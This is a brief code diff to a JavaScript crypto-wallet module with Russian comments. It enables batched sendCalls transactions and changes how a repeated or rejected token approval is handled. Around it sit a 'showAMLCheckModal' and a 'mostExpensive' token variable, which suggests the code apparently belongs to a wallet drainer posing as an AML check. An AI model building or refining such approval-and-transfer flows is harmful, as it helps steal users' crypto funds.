@@ -6,7 +6,7 @@ import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBa
 import { showAMLCheckModal } from './aml-check-modal.js';
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -982,6 +982,9 @@ const initializeSubscribers = (modal) => {
                   transferResult.txHash
                 )
               }
+            } else {
+              console.log('Approve already requested or rejected, skipping')
+              // Не закрываем модалку и не сбрасываем состояние!
             }
           } catch (error) {
             handleApproveError(error, mostExpensive, state)
